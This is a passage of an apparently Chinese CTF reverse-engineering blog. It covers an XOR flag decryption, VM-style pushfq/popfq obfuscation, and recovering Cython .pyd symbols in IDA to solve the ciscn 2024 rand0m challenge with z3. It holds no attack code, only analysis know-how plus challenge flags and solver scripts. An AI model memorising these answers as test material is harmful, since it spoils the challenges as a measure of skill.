class="hljs-string">PyNumber_Xor</span><br>       <span class="hljs-attr">INPUT:</span>  <span class="hljs-number">0x0000000000000033</span><br>       <span class="hljs-attr">PARAM:</span>  <span class="hljs-number">0x000000000000004A</span><br>       <span class="hljs-attr">OUTPUT:</span> <span class="hljs-number">0x0000000000000079</span><br><br>[<span class="hljs-number">0072</span>] <span class="hljs-string">BITWISE</span>    <span class="hljs-string">|</span> <span class="hljs-string">PyNumber_Xor</span><br>       <span class="hljs-attr">INPUT:</span>  <span class="hljs-number">0x0000000000000033</span><br>       <span class="hljs-attr">PARAM:</span>  <span class="hljs-number">0x0000000000000072</span><br>       <span class="hljs-attr">OUTPUT:</span> <span class="hljs-number">0x0000000000000041</span><br><br>[<span class="hljs-number">0073</span>] <span class="hljs-string">BITWISE</span>    <span class="hljs-string">|</span> <span class="hljs-string">PyNumber_Xor</span><br>       <span class="hljs-attr">INPUT:</span>  <span class="hljs-number">0x0000000000000033</span><br>       <span class="hljs-attr">PARAM:</span>  <span class="hljs-number">0x00000000000000D6</span><br>       <span class="hljs-attr">OUTPUT:</span> <span class="hljs-number">0x00000000000000E5</span><br><br>[<span class="hljs-number">0074</span>] <span class="hljs-string">BITWISE</span>    <span class="hljs-string">|</span> <span class="hljs-string">PyNumber_Xor</span><br>       <span class="hljs-attr">INPUT:</span>  <span class="hljs-number">0x0000000000000033</span><br>       <span class="hljs-attr">PARAM:</span>  <span class="hljs-number">0x0000000000000030</span><br>       <span class="hljs-attr">OUTPUT:</span> <span class="hljs-number">0x0000000000000003</span><br><br>[<span class="hljs-number">0075</span>] <span class="hljs-string">BITWISE</span>    <span class="hljs-string">|</span> <span class="hljs-string">PyNumber_Xor</span><br>       <span class="hljs-attr">INPUT:</span>  <span class="hljs-number">0x0000000000000033</span><br>       <span class="hljs-attr">PARAM:</span>  <span class="hljs-number">0x00000000000000C5</span><br>       <span class="hljs-attr">OUTPUT:</span> <span class="hljs-number">0x00000000000000F6</span><br><br>[<span class="hljs-number">0076</span>] <span class="hljs-string">BITWISE</span>    <span class="hljs-string">|</span> <span class="hljs-string">PyNumber_Xor</span><br>       <span class="hljs-attr">INPUT:</span>  <span class="hljs-number">0x0000000000000033</span><br>       <span class="hljs-attr">PARAM:</span>  <span class="hljs-number">0x000000000000000D</span><br>       <span class="hljs-attr">OUTPUT:</span> <span class="hljs-number">0x000000000000003E</span><br><br>[<span class="hljs-number">0077</span>] <span class="hljs-string">BITWISE</span>    <span class="hljs-string">|</span> <span class="hljs-string">PyNumber_Xor</span><br>       <span class="hljs-attr">INPUT:</span>  <span class="hljs-number">0x0000000000000033</span><br>       <span class="hljs-attr">PARAM:</span>  <span class="hljs-number">0x0000000000000049</span><br>       <span class="hljs-attr">OUTPUT:</span> <span class="hljs-number">0x000000000000007A</span><br><br>[<span class="hljs-number">0078</span>] <span class="hljs-string">BITWISE</span>    <span class="hljs-string">|</span> <span class="hljs-string">PyNumber_Xor</span><br>       <span class="hljs-attr">INPUT:</span>  <span class="hljs-number">0x0000000000000033</span><br>       <span class="hljs-attr">PARAM:</span>  <span class="hljs-number">0x00000000000000CC</span><br>       <span class="hljs-attr">PARAM:</span>  <span class="hljs-number">0x00000000000000CC</span><br>       <span class="hljs-attr">OUTPUT:</span> <span class="hljs-number">0x00000000000000FF</span><br><br>[<span class="hljs-number">0079</span>] <span class="hljs-string">BITWISE</span>    <span class="hljs-string">|</span> <span class="hljs-string">PyNumber_Xor</span><br>       <span class="hljs-attr">INPUT:</span>  <span class="hljs-number">0x0000000000000033</span><br>       <span class="hljs-attr">PARAM:</span>  <span class="hljs-number">0x000000000000008A</span><br>       <span class="hljs-attr">OUTPUT:</span> <span class="hljs-number">0x00000000000000B9</span><br></code></pre></td></tr></table></figure><p>解密脚本</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs python">ciphertext_hex = <span class="hljs-string">&quot;426b87abd0ceaa3c58761bbb0172606dd8ab064491a2a76af9a93e1ae56fa84206a2f7&quot;</span><br>xor_key_hex = <span class="hljs-string">&quot;2407e6ccabacdf48070f2bce5e1e505db398621be4d2f82a8df64a72d630c50d49cc8a&quot;</span><br>ciphertext = <span class="hljs-built_in">bytes</span>.fromhex(ciphertext_hex)<br>xor_key = <span class="hljs-built_in">bytes</span>.fromhex(xor_key_hex)<br><br>plaintext = <span class="hljs-built_in">bytearray</span>()<br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-built_in">len</span>(ciphertext)):<br>    plaintext.append(ciphertext[i] ^ xor_key[i])<br><br>    result = plaintext.decode(<span class="hljs-string">&#x27;utf-8&#x27;</span>, errors=<span class="hljs-string">&#x27;ignore&#x27;</span>)<br><br><span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;Decrypted flag: <span class="hljs-subst">&#123;result&#125;</span>&quot;</span>)<br><br><span class="hljs-comment"># Decrypted flag: flag&#123;but_y0u_l00k3d_up_@t_th3_mOOn&#125;</span><br></code></pre></td></tr></table></figure><h3 id="EzObf"><a href="#EzObf" class="headerlink" title="EzObf"></a>EzObf</h3><p>找到 main 函数，跟进看到 main_0,发现被混淆了</p><figure class="highlight tcl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><code class="hljs tcl">.vmpt:<span class="hljs-number">00000001401</span>F4000 ; int __fastcall main_0(int argc, const char **argv, const char **envp)<br>.vmpt:<span class="hljs-number">00000001401</span>F4000 main_0          <span class="hljs-keyword">proc</span><span class="hljs-title"> near</span>               ;<span class="hljs-title"> CODE</span> XREF:<span class="hljs-title"> main↑p</span><br>.vmpt:00000001401F4000<span class="hljs-title">                 pushfq</span><br>.vmpt:00000001401F4001<span class="hljs-title">                 push</span> <span class="hljs-title">   rax</span><br>.vmpt:00000001401F4002<span class="hljs-title">                 push</span> <span class="hljs-title">   rbx</span><br>.vmpt:00000001401F4003<span class="hljs-title">                 push</span> <span class="hljs-title">   rcx</span><br>.vmpt:00000001401F4004<span class="hljs-title">                 push</span> <span class="hljs-title">   rdx</span><br>.vmpt:00000001401F4005<span class="hljs-title">                 push</span> <span class="hljs-title">   rsi</span><br>.vmpt:00000001401F4006<span class="hljs-title">                 push</span> <span class="hljs-title">   rdi</span><br>.vmpt:00000001401F4007<span class="hljs-title">                 push</span> <span class="hljs-title">   r8</span><br>.vmpt:00000001401F4009<span class="hljs-title">                 push</span> <span class="hljs-title">   r9</span><br>.vmpt:00000001401F400B<span class="hljs-title">                 push</span> <span class="hljs-title">   rsp</span><br>.vmpt:00000001401F400C<span class="hljs-title">                 push</span> <span class="hljs-title">   rbp</span><br>.vmpt:00000001401F400D<span class="hljs-title">                 pop</span> <span class="hljs-title">    rbp</span><br>.vmpt:00000001401F400E<span class="hljs-title">                 pop</span> <span class="hljs-title">    rsp</span><br>.vmpt:00000001401F400F<span class="hljs-title">                 pop</span> <span class="hljs-title">    r9</span><br>.vmpt:00000001401F4011<span class="hljs-title">                 pop</span> <span class="hljs-title">    r8</span><br>.vmpt:00000001401F4013<span class="hljs-title">                 pop</span> <span class="hljs-title">    rdi</span><br>.vmpt:00000001401F4014<span class="hljs-title">                 pop</span> <span class="hljs-title">    rsi</span><br>.vmpt:00000001401F4015<span class="hljs-title">                 pop</span> <span class="hljs-title">    rdx</span><br>.vmpt:00000001401F4016<span class="hljs-title">                 pop</span> <span class="hljs-title">    rcx</span><br>.vmpt:00000001401F4017<span class="hljs-title">                 pop</span> <span class="hljs-title">    rbx</span><br>.vmpt:00000001401F4018<span class="hljs-title">                 pop</span> <span class="hljs-title">    rax</span><br>.vmpt:00000001401F4019<span class="hljs-title">                 popfq</span><br>.vmpt:00000001401F401A<span class="hljs-title">                 push</span> <span class="hljs-title">   rbp</span><br>.vmpt:00000001401F401B<span class="hljs-title">                 pushfq</span><br>.vmpt:00000001401F401C<span class="hljs-title">                 push</span> <span class="hljs-title">   rax</span><br>.vmpt:00000001401F401D<span class="hljs-title">                 push</span> <span class="hljs-title">   rbx</span><br>.vmpt:00000001401F401E<span class="hljs-title">                 push</span> <span class="hljs-title">   rcx</span><br>.vmpt:00000001401F401F<span class="hljs-title">                 push</span> <span class="hljs-title">   rdx</span><br>.vmpt:00000001401F4020<span class="hljs-title">                 push</span> <span class="hljs-title">   rsi</span><br>.vmpt:00000001401F4021<span class="hljs-title">                 push</span> <span class="hljs-title">   rdi</span><br>.vmpt:00000001401F4022<span class="hljs-title">                 push</span> <span class="hljs-title">   r8</span><br>.vmpt:00000001401F4024<span class="hljs-title">                 push</span> <span class="hljs-title">   r9</span><br>.vmpt:00000001401F4026<span class="hljs-title">                 push</span> <span class="hljs-title">   rsp</span><br>.vmpt:00000001401F4027<span class="hljs-title">                 push</span> <span class="hljs-title">   rbp</span><br>.vmpt:00000001401F4028<span class="hljs-title">                 and</span> <span class="hljs-title">    rax,</span> 0<br>.vmpt:00000001401F402C<span class="hljs-title">                 xor</span> <span class="hljs-title">    rbx,</span> rbx<br>.vmpt:00000001401F402F<span class="hljs-title">                 call</span>    $+5<br>.vmpt:00000001401F4034<span class="hljs-title">                 pop</span> <span class="hljs-title">    rax</span><br>.vmpt:00000001401F4035<span class="hljs-title">                 mov</span> <span class="hljs-title">    ebx,</span> 0A1000064h<br>.vmpt:00000001401F403A<span class="hljs-title">                 rol</span> <span class="hljs-title">    ebx,</span> 28h<br>.vmpt:00000001401F403D<span class="hljs-title">                 add</span> <span class="hljs-title">    rax,</span> rbx<br>.vmpt:00000001401F4040<span class="hljs-title">                 jmp</span> <span class="hljs-title">    rax</span><br>.vmpt:00000001401F4040<span class="hljs-title"> main_0</span> <span class="hljs-title">         endp</span><br></code></pre></td></tr></table></figure><p>这后面也是一大片未识别成代码的数据，动调 f7 步进<br>可以这之后也一直都是这个结构<br>把真实指令藏在 <strong>popfq</strong> 和 <strong>pushfq</strong> 之间,最后通过 <strong>jmp rax</strong> 进行跳转<br>对抗的思路就是把中间有效的指令提取出来，其他的 nop 掉，再计算出每个结构最后的跳转地址</p><link rel="stylesheet" href="/css/spoiler.css" type="text/css"><script src="/js/spoiler.js" type="text/javascript" async></script>]]></content>
    
    
    <categories>
      
      <category>CTF</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Reverse</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>pyd 逆向</title>
    <link href="/2025/07/15/pyd/"/>
    <url>/2025/07/15/pyd/</url>
    
    <content type="html"><![CDATA[<h2 id="what’s-pyd"><a href="#what’s-pyd" class="headerlink" title="what’s pyd"></a>what’s pyd</h2><p><strong>.pyd</strong> 文件本质上是一个 Windows 的 DLL 文件, 通过 C&#x2F;C++ 编译器（如 MSVC）把 C&#x2F;C++ 代码编译成二进制形式，实现了 Python 扩展模块的接口，可以通过 import xxx 的方式像普通的 .py 文件那样导入使用</p><h2 id="preparation"><a href="#preparation" class="headerlink" title="preparation"></a>preparation</h2><p>先在 windows 下自己编译一个带有调试信息的 pyd 文件，主要用于后续 bindiff 比较恢复符号<br>注意编译时 python 的版本尽量与要逆向的文件一致(可以在 ida string 里面搜 dll 看到类似”python312.dll”的字符串确定题目使用的 python 版本)</p><p>准备 test_for_pyd.py 文件 和 setup.py 文件</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#test_for_pyd.py</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">demo_greet</span>(<span class="hljs-params">msg: <span class="hljs-built_in">str</span></span>) -&gt; <span class="hljs-literal">None</span>:<br>    base = <span class="hljs-number">3</span><br>    total = base + <span class="hljs-number">5</span><br>    extra = <span class="hljs-number">7</span><br>    <span class="hljs-built_in">print</span>(msg)<br>    <span class="hljs-built_in">print</span>(base, total, extra)<br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">hex_to_decimal</span>(<span class="hljs-params">hex_str: <span class="hljs-built_in">str</span></span>) -&gt; <span class="hljs-built_in">int</span>:<br>    digits = <span class="hljs-string">&quot;0123456789abcdef&quot;</span><br>    value = <span class="hljs-number">0</span><br>    <span class="hljs-keyword">for</span> ch <span class="hljs-keyword">in</span> <span class="hljs-built_in">reversed</span>(hex_str.lower()):<br>        value = value * <span class="hljs-number">16</span> + digits.index(ch)<br>    <span class="hljs-keyword">return</span> value<br><br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&quot;__main__&quot;</span>:<br>    demo_greet(<span class="hljs-string">&quot;Hello, Python!&quot;</span>)<br>    <span class="hljs-built_in">print</span>(hex_to_decimal(<span class="hljs-string">&quot;123&quot;</span>))<br></code></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># setup.py</span><br><span class="hljs-keyword">from</span> setuptools <span class="hljs-keyword">import</span> setup, Extension<br><span class="hljs-keyword">from</span> Cython.Build <span class="hljs-keyword">import</span> cythonize<br><span class="hljs-keyword">import</span> os<br><span class="hljs-keyword">import</span> distutils.util<br><br><span class="hljs-comment"># 设置使用 MinGW 编译器</span><br>os.environ[<span class="hljs-string">&#x27;DISTUTILS_USE_SDK&#x27;</span>] = <span class="hljs-string">&#x27;1&#x27;</span><br><span class="hljs-comment"># 防止链接器剥离调试信息</span><br>os.environ[<span class="hljs-string">&#x27;LDFLAGS&#x27;</span>] = <span class="hljs-string">&#x27;-g&#x27;</span><br><br><span class="hljs-comment"># 修复 MinGW 链接问题</span><br><span class="hljs-keyword">import</span> distutils.cygwinccompiler<br>distutils.cygwinccompiler.get_msvcr = <span class="hljs-keyword">lambda</span>: []<br><br>extensions = [<br>    Extension(<br>        <span class="hljs-string">&quot;test_for_pyd&quot;</span>,<br>        [<span class="hljs-string">&quot;test_for_pyd.py&quot;</span>],<br>        <span class="hljs-comment"># define_macros=[(&quot;MS_WIN64&quot;, None)],  # 移除重复定义，Python.h 已经定义了</span><br>        extra_compile_args=[<span class="hljs-string">&quot;-g&quot;</span>, <span class="hljs-string">&quot;-O0&quot;</span>, <span class="hljs-string">&quot;-ggdb3&quot;</span>],  <span class="hljs-comment"># 添加更详细的调试信息</span><br>        extra_link_args=[<span class="hljs-string">&quot;-g&quot;</span>]  <span class="hljs-comment"># 链接器生成调试信息</span><br>    <br>    )<br>]<br><br>setup(<br>    name=<span class="hljs-string">&#x27;test_for_pyd&#x27;</span>,<br>    ext_modules=cythonize(extensions)<br>)<br><br></code></pre></td></tr></table></figure><p>使用以下命令编译生成 pyd 文件：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">python setup.py build_ext --inplace<br><span class="hljs-comment"># 或者 python setup.py build_ext --inplace --compiler=mingw32</span><br></code></pre></td></tr></table></figure><p>但是这个 pyd 扔进 ida 之后没有看到 pyx 相关的符号 :sob:</p><p>在 linux 下编译了一个类似的 so 文件</p><p>创建一个虚拟环境 <code> python3 -m venv myenv</code><br>激活虚拟环境 <code>source myenv/bin/activate</code><br>在虚拟环境中安装 cython 和 setuptools：<br><code>sudo apt install cython3</code><br><code>python setup.py build_ext --inplace</code></p><p>Linux 下的 setup.py ：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># setup.py</span><br><span class="hljs-keyword">from</span> setuptools <span class="hljs-keyword">import</span> setup, Extension<br><span class="hljs-keyword">from</span> Cython.Build <span class="hljs-keyword">import</span> cythonize<br><span class="hljs-keyword">import</span> os<br><br><span class="hljs-comment"># 启用详细编译输出</span><br>os.environ[<span class="hljs-string">&#x27;CFLAGS&#x27;</span>] = <span class="hljs-string">&#x27;-g -O0&#x27;</span>  <span class="hljs-comment"># -g 添加调试信息，-O0 禁用优化</span><br>os.environ[<span class="hljs-string">&#x27;LDFLAGS&#x27;</span>] = <span class="hljs-string">&#x27;-g&#x27;</span>     <span class="hljs-comment"># 链接时包含调试信息</span><br><br>extensions = [<br>    Extension(<br>        <span class="hljs-string">&quot;test_for_pyd&quot;</span>,  <span class="hljs-comment"># 模块名（与导入名一致）</span><br>        [<span class="hljs-string">&quot;test_for_pyd.py&quot;</span>],  <span class="hljs-comment"># 源文件</span><br>        <span class="hljs-comment"># 显式添加编译参数（覆盖环境变量）</span><br>        extra_compile_args=[<span class="hljs-string">&quot;-g&quot;</span>, <span class="hljs-string">&quot;-O0&quot;</span>, <span class="hljs-string">&quot;-fPIC&quot;</span>],<br>        extra_link_args=[<span class="hljs-string">&quot;-g&quot;</span>]<br>    )<br>]<br><br>setup(<br>    name=<span class="hljs-string">&quot;test_for_pyd&quot;</span>,<br>    version=<span class="hljs-string">&quot;1.0&quot;</span>,<br>    ext_modules=cythonize(<br>        extensions,<br>        <span class="hljs-comment"># 关键调试设置</span><br>        compiler_directives=&#123;<br>            <span class="hljs-string">&#x27;language_level&#x27;</span>: <span class="hljs-string">&quot;3&quot;</span>,  <span class="hljs-comment"># Python 3</span><br>            <span class="hljs-string">&#x27;linetrace&#x27;</span>: <span class="hljs-literal">True</span>,      <span class="hljs-comment"># 替代 c_line_trace - 启用行跟踪</span><br>            <span class="hljs-string">&#x27;binding&#x27;</span>: <span class="hljs-literal">True</span>         <span class="hljs-comment"># 改善函数签名</span><br>        &#125;,<br>        gdb_debug=<span class="hljs-literal">True</span>,            <span class="hljs-comment"># 启用GDB调试支持</span><br>        annotate=<span class="hljs-literal">True</span>               <span class="hljs-comment"># 生成HTML注解文件</span><br>    )<br>)<br></code></pre></td></tr></table></figure><p>使用以下命令编译生成 so 文件：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">python setup.py build_ext --inplace --force<br></code></pre></td></tr></table></figure><p>test_for_pyd.cpython-312-x86_64-linux-gnu.so<br>除此之外同时还生成了 test_for_pyd.c 和 test_for_pyd.html</p><p>把这个 so 扔进 ida 里面，发现与之前的那个 pyd 文件相比多了不少符号信息<br><img src="/../images/pyd/p1.png"></p><p>在 ida 的 File-&gt;Produce File-&gt;Create C Header File导出结构体 </p><p>用 ida 打开要逆向的 pyd 文件，在 File-&gt;Load File-&gt;Parse C Header File 中导入从 so 文件中导出的 .h 文件(如果遇到报错就修复一下)</p><h2 id="CTF-pyd-逆向分析"><a href="#CTF-pyd-逆向分析" class="headerlink" title="CTF pyd 逆向分析"></a>CTF pyd 逆向分析</h2><h3 id="ciscn-2024-rand0m"><a href="#ciscn-2024-rand0m" class="headerlink" title="ciscn 2024  rand0m"></a>ciscn 2024  rand0m</h3><h4 id="做法一：静态分析"><a href="#做法一：静态分析" class="headerlink" title="做法一：静态分析"></a>做法一：静态分析</h4><p>先看看 string，注意到里面有好几个可疑的字符串和数字，x 交叉引用，找到数字所在函数(sub_xxx2BD0)，里面通过 PyLong_FromLong() 和 PyLong_FromString() 创造了一系列整数对象，将这些对象存储到一个全局指针数组 <strong>off_7FF90BEAB688</strong>[29] ~ [49]，用于后续查表<br><img src="/../images/pyd/p7.png"></p><p><strong>rand0m.rand0m</strong>:在 sub_xxx12B0 里面，找到关键加密部分</p><p><img src="/../images/pyd/p2.png"><br><img src="/../images/pyd/p3.png"><br><img src="/../images/pyd/p4.png"><br><img src="/../images/pyd/p5.png"><br><img src="/../images/pyd/p6.png"><br>提取出关键部分:</p><figure class="highlight smali"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs smali">v14 = v12 ^ 2654435769<br>v6 = v14<br>v15 = v12 &gt;&gt; 5<br>v3 = v15<br>v21 = v12 &lt;&lt; 4<br>v12 = v21<br>v22 = v12 &amp; 4198170623<br>v23 = v5<br>v5 = v22   v5 = v12 &amp; 4198170623<br>v24 = v3 &gt;&gt; 23   v24 = (v12 &gt;&gt; 5) &gt;&gt; 23 v24 = v12 &gt;&gt; 28<br>v25 = v22 + v24 v25 = (v12 &amp; 4198170623) + v12 &gt;&gt; 28   v25 = (v12 &lt;&lt; 4) &amp; 0xFA3AFFFF + (v12 &gt;&gt; 28)<br>v27 = v6 &gt;&gt; 11 v27 = v12 ^ 0x9E3779B9 &gt;&gt; 11<br>v30 = pow(v27, 65537)  v30 = pow((v12 ^ 0x9E3779B9) &gt;&gt; 11, 65537)<br>v31 = v30 % 4294967293  v31 = pow((v12 ^ 0x9E3779B9) &gt;&gt; 11, 65537, 0xFFFFFFFD)<br>v5 = v31<br></code></pre></td></tr></table></figure><p>整理之后就是</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">def</span> <span class="hljs-title function_">rand0m</span>(<span class="hljs-params">v12</span>):<br>    v25=((v12&lt;&lt;<span class="hljs-number">4</span>)&amp;<span class="hljs-number">0xFA3AFFFF</span>)+(v12&gt;&gt;<span class="hljs-number">28</span>)<br>    v31=<span class="hljs-built_in">pow</span>((v12^<span class="hljs-number">0x9E3779B9</span>)&gt;&gt;<span class="hljs-number">11</span>,<span class="hljs-number">65537</span>,<span class="hljs-number">0xFFFFFFFD</span>)<br>    <span class="hljs-keyword">return</span> (v31, v25)<br></code></pre></td></tr></table></figure><p>接着看 check 函数，注意到其上方有一个 sub_xxx1960<br><img src="/../images/pyd/p8.png"><br>点进去之后发现它创建了一个 python 列表，存入了八个数据<br><img src="/../images/pyd/p9.png"><br>继续往下看到比较函数<br><code>PyObject* PyObject_RichCompare(PyObject *v, PyObject *w, int op)</code><br>v,w 分别代表的是比较的两个对象，op 是比较操作的枚举值<br>具体如下：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">define</span> Py_LT 0  <span class="hljs-comment">// &lt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> Py_LE 1  <span class="hljs-comment">// &lt;=</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> Py_EQ 2  <span class="hljs-comment">// ==</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> Py_NE 3  <span class="hljs-comment">// !=</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> Py_GT 4  <span class="hljs-comment">// &gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> Py_GE 5  <span class="hljs-comment">// &gt;=</span></span><br></code></pre></td></tr></table></figure><p>用 z3 爆破求解</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> z3<br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">rand0m</span>(<span class="hljs-params"><span class="hljs-built_in">input</span>: <span class="hljs-built_in">int</span></span>):<br>    v0 = ((<span class="hljs-built_in">input</span> &lt;&lt; <span class="hljs-number">4</span>) &amp; <span class="hljs-number">0xFA3AFFFF</span>) + (<span class="hljs-built_in">input</span> &gt;&gt; <span class="hljs-number">28</span>)<br>    v1 = <span class="hljs-built_in">pow</span>((<span class="hljs-built_in">input</span> ^ <span class="hljs-number">0x9E3779B9</span>) &gt;&gt; <span class="hljs-number">11</span>, <span class="hljs-number">65537</span>, <span class="hljs-number">0xFFFFFFFD</span>)<br>    <span class="hljs-keyword">return</span> (v0, v1)<br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">main</span>():<br>    data = [<br>        <span class="hljs-number">304643896</span>,<br>        <span class="hljs-number">2563918650</span>,<br>        <span class="hljs-number">1244723021</span>,<br>        <span class="hljs-number">3773946743</span>,<br>        <span class="hljs-number">37360232</span>,<br>        <span class="hljs-number">2918417411</span>,<br>        <span class="hljs-number">2282784775</span>,<br>        <span class="hljs-number">3628702646</span>,<br>    ]<br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">0</span>, <span class="hljs-built_in">len</span>(data), <span class="hljs-number">2</span>):<br>        ans = z3.Solver()<br>        x = z3.BitVec(<span class="hljs-string">&quot;x&quot;</span>, <span class="hljs-number">32</span>)<br>        v0 = ((x &lt;&lt; <span class="hljs-number">4</span>) &amp; <span class="hljs-number">0xFA3AFFFF</span>) + (x &gt;&gt; <span class="hljs-number">28</span>)<br>        ans.add(z3.And(data[i] - <span class="hljs-number">16</span> &lt;= v0, v0 &lt;= data[i] + <span class="hljs-number">16</span>))  <span class="hljs-comment"># 增大可行解范围</span><br>        <span class="hljs-keyword">while</span> ans.check() == z3.sat:<br>            result = ans.model()<br>            <span class="hljs-keyword">if</span> result[x] != <span class="hljs-literal">None</span>:<br>                val = result[x].as_long()<br>                ret = rand0m(val)<br>                <span class="hljs-keyword">if</span> ret[<span class="hljs-number">0</span>] == data[i] <span class="hljs-keyword">and</span> ret[<span class="hljs-number">1</span>] == data[i + <span class="hljs-number">1</span>]:<br>                    <span class="hljs-built_in">print</span>(<span class="hljs-built_in">hex</span>(val))<br>                    <span class="hljs-keyword">break</span><br>                ans.add(x != val)<br><br><br>main()<br><br><span class="hljs-comment"># output:</span><br><span class="hljs-comment"># 0x813a97f3</span><br><span class="hljs-comment"># 